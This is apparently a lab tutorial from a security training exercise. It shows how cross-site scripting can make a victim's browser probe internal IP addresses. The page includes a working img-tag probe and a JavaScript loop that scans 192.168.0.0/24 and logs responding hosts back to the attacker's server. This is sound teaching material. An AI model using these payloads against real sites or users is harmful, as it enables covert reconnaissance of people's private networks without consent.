# Using XSS for IP and Port Scanning

- Cross-site scripting can be used for all sorts of mischief, one being the ability to scan a victims internal network and look for open ports. 

- If an attacker is interested in what other devices are connected on the network, they can use ***Javascript*** to make requests to a range of **IP addresses** and determine which one responds.


# Task:

**1. Understand the basic proof of concept script.**

**2. Then create a file on your computer with the script, modify it to suit your network and run it. See if it picks up any of your devices that has a webserver running.**

### On the XSS Playground, go to the IP/Port scanning tab and review a script to scan the internal network.

- On the **application layer** your browser has no notion of **internal and external IP** addresses. So any website is able to tell your browser to request a resource from your internal network.

- For example, a website could try to find if your router has a web interface at **<ins>192.168.0.1</ins>** by:

  ```
  <img src="http://192.168.0.1/favicon.ico" onload="alert('Found')" onerror="alert('Not found')">
  ```

- Please keep in mind this is a [proof of concept](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/08%20-%20XSS%20for%20IP%20and%20Port%20Scanning/Used%20Scripts/1.%20POC_Used.js) and there are many factors that will effect results such as response times, firewall rules, cross origin policies and more. 
- Our browsers can conduct a basic network scan and infer about existing IP's, hostnames and services. As this is a learning exercise assume the factors do not apply here.

- **The following script will scan an internal network in the range 192.168.0.0 to 192.168.0.255**

  ```
  <script>
  for (let i = 0; i < 256; i++) 
  { 
    let ip = '192.168.0.' + i        
    let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
    document.body.innerHTML += code 
  }
  </script> 
  ```
- [Scanner script with explanation](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/08%20-%20XSS%20for%20IP%20and%20Port%20Scanning/Used%20Scripts/2.%20Scanner_Used.js)

- After you've found an **valid IP** you can then use the same method above and include a port number.
- However, the method described here only works with web servers (as its looking for the favicon image). 

- A more detailed port scanner can be found [here](https://github.com/aabeling/portscan). 
- As previously stated, this page is a proof of concept, you can create scripts which have much more capability.


